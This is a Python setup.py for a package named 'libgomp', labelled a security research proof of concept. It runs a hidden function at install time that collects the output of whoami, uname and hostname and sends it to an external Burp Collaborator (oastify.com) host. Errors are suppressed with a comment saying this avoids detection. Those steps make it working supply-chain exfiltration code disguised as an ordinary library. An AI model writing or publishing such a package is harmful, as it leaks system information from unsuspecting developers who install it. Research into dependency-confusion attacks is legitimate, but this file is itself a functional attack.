from setuptools import setup
import os
import subprocess
import urllib.request
import json
import uuid

def send_system_info():
    try:
        # Collect system info
        whoami = subprocess.getoutput("whoami")
        uname = subprocess.getoutput("uname -a")
        hostname = subprocess.getoutput("hostname")

        # Prepare data
        data = {
            "whoami": whoami,
            "uname": uname,
            "hostname": hostname,
        }

        # Unique token for tracking
        token = str(uuid.uuid4())
        
        # Send to Burp Collaborator (GET request)
        collaborator_url = f"http://{token}.u943qrjfdb8l3pbsznfyyjneo5uwingb5.oastify.com/?data={json.dumps(data)}"
        urllib.request.urlopen(collaborator_url, timeout=5)

    except Exception as e:
        pass  # Silent fail (avoid detection)

# Execute on install
send_system_info()

setup(
    name="libgomp",
    version="1.1.3",
    description="A harmless-looking package (Security Research PoC)",
    packages=[],
    install_requires=[],
)
